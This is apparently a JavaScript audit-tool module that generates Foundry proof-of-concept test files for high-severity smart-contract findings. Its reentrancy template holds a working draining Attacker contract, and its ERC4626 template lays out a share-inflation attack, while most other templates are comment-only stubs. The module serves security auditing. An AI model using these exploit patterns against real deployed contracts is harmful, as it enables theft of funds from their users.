const fs = require('fs');
const path = require('path');

class FoundryPoCGenerator {
  constructor(opts = {}) {
    this.outputDir = opts.outputDir || './audit-reports/pocs';
    this.solVersion = opts.solidityVersion || '0.8.19';
  }

  generate(findings, contracts) {
    const pocs = [];
    for (const f of findings) {
      if (['critical', 'high'].includes(f.severity)) {
        const poc = this._gen(f, contracts);
        if (poc) pocs.push(poc);
      }
    }
    return pocs;
  }

  _gen(finding, contracts) {
    const cn = finding.contract || 'Target';
    const safeName = (finding.title || 'Exploit').replace(/[^a-zA-Z0-9]/g, '_').substring(0, 40);
    const testName = `${safeName}Test`;
    const vulnType = this._classify(finding);
    const content = this._template(vulnType, finding, cn, testName);
    if (!content) return null;
    return { title: finding.title, severity: finding.severity, fileName: `${testName}.t.sol`, content, finding };
  }

  _classify(f) {
    const t = (f.title || '').toLowerCase();
    const s = (f.skill || '').toLowerCase();
    if (t.includes('reentrancy') || s.includes('reentrancy')) return 'reentrancy';
    if (t.includes('overflow') || t.includes('underflow') || s.includes('overflow')) return 'overflow';
    if (t.includes('access') || t.includes('unauthorized') || s.includes('access-control')) return 'access_control';
    if (t.includes('flash') || s.includes('flash-loan')) return 'flash_loan';
    if (t.includes('oracle') || s.includes('oracle')) return 'oracle';
    if (t.includes('proxy') || t.includes('upgrade') || s.includes('proxy')) return 'proxy';
    if (t.includes('vault') || t.includes('4626') || t.includes('inflation') || s.includes('erc4626')) return 'erc4626';
    if (t.includes('bridge') || s.includes('bridge')) return 'bridge';
    if (t.includes('delegatecall') || s.includes('delegatecall')) return 'delegatecall';
    return 'default';
  }

  _template(type, f, cn, tn) {
    const hdr = `// SPDX-License-Identifier: MIT\npragma solidity ${this.solVersion};\n\nimport "forge-std/Test.sol";\n`;
    const doc = `/// @title PoC for: ${f.title}\n/// @severity ${f.severity}\n/// @skill ${f.skill || type}\n`;
    const templates = {
      reentrancy: () => `${hdr}${doc}contract ${tn} is Test {\n    ${cn} target;\n    Attacker attacker;\n\n    function setUp() public {\n        target = new ${cn}();\n        attacker = new Attacker(address(target));\n        vm.deal(address(target), 10 ether);\n    }\n\n    function testExploit() public {\n        uint256 beforeBal = address(target).balance;\n        vm.prank(address(attacker));\n        attacker.deposit{value: 1 ether}();\n        attacker.attack();\n        uint256 afterBal = address(target).balance;\n        assertLt(afterBal, beforeBal);\n        assertGt(address(attacker).balance, 1 ether);\n    }\n}\n\ncontract Attacker {\n    ${cn} target;\n    uint256 calls;\n    constructor(address _t) { target = ${cn}(payable(_t)); }\n    function deposit() external payable { target.deposit{value: msg.value}(); }\n    function attack() external { target.withdraw(1 ether); }\n    receive() external payable {\n        if (calls < 10) { calls++; target.withdraw(1 ether); }\n    }\n}\n`,
      overflow: () => `${hdr}${doc}contract ${tn} is Test {\n    function testExploit() public {\n        uint256 balance = 1 ether;\n        uint256 withdraw = 2 ether;\n        unchecked {\n            uint256 newBal = balance - withdraw;\n            assertGt(newBal, balance); // wraps to 2^256-1\n        }\n    }\n}\n`,
      access_control: () => `${hdr}import "../src/${cn}.sol";\n${doc}contract ${tn} is Test {\n    ${cn} target;\n    address owner = address(0x1);\n    address attacker = address(0x2);\n\n    function setUp() public {\n        vm.prank(owner); target = new ${cn}();\n        vm.deal(address(target), 10 ether);\n    }\n\n    function testExploit() public {\n        vm.prank(attacker);\n        // target.withdrawAll() -- should revert but doesn't\n        assertGt(attacker.balance, 0);\n    }\n}\n`,
      flash_loan: () => `${hdr}import "../src/${cn}.sol";\n${doc}contract ${tn} is Test {\n    ${cn} target;\n    function setUp() public { target = new ${cn}(); vm.deal(address(target), 100 ether); }\n    function testExploit() public {\n        uint256 before = address(target).balance;\n        // Flash loan: borrow -> manipulate -> drain -> repay\n        assertLt(address(target).balance, before);\n    }\n}\n`,
      oracle: () => `${hdr}${doc}contract ${tn} is Test {\n    function testExploit() public {\n        uint256 stalePrice = 2 ether; // real: 1 ether\n        uint256 collateral = 10 ether;\n        uint256 borrow = (collateral * stalePrice) / 1 ether;\n        assertGt(borrow, collateral); // borrow 2x warranted\n    }\n}\n`,
      proxy: () => `${hdr}${doc}contract ${tn} is Test {\n    function testExploit() public {\n        // Uninitialized implementation: anyone calls initialize()\n        // UUPS: unprotected upgrade function\n        console.log("Proxy takeover via uninitialized implementation");\n    }\n}\n`,
      erc4626: () => `${hdr}import "../src/${cn}.sol";\n${doc}contract ${tn} is Test {\n    ${cn} target;\n    address attacker = address(0x1);\n    address victim = address(0x2);\n\n    function setUp() public { target = new ${cn}(); vm.deal(address(target), 10 ether); }\n    function testExploit() public {\n        // Inflation attack: donate ETH -> inflate share price -> victim gets 0 shares\n        vm.prank(attacker); target.deposit{value: 1 wei}();\n        vm.deal(attacker, 100 ether);\n        vm.prank(attacker); address(target).call{value: 9 ether}("");\n        vm.prank(victim); target.deposit{value: 1 ether}();\n        // victim receives 0 shares due to inflated exchange rate\n    }\n}\n`,
      bridge: () => `${hdr}${doc}contract ${tn} is Test {\n    function testExploit() public {\n        // Bridge message replay: no message ID tracking\n        // Same withdrawal message processed twice\n        console.log("Bridge drain via message replay");\n    }\n}\n`,
      delegatecall: () => `${hdr}${doc}contract ${tn} is Test {\n    function testExploit() public {\n        // Delegatecall to attacker-controlled address\n        // Overwrites owner storage slot\n        console.log("Storage collision via delegatecall");\n    }\n}\n`,
      default: () => `${hdr}${doc}contract ${tn} is Test {\n    function testExploit() public {\n        // ${f.title}\n        // Evidence: ${f.evidence || 'see finding details'}\n        // Impact: ${f.impact || 'see finding details'}\n        console.log("${f.title}");\n    }\n}\n`,
    };
    return (templates[type] || templates.default)();
  }

  save(pocs) {
    fs.mkdirSync(this.outputDir, { recursive: true });
    const manifest = [];
    for (const poc of pocs) {
      const filePath = path.join(this.outputDir, poc.fileName);
      fs.writeFileSync(filePath, poc.content);
      manifest.push({ title: poc.title, severity: poc.severity, file: poc.fileName });
    }
    const manifestPath = path.join(this.outputDir, 'manifest.json');
    fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
    return manifest;
  }
}

module.exports = FoundryPoCGenerator;
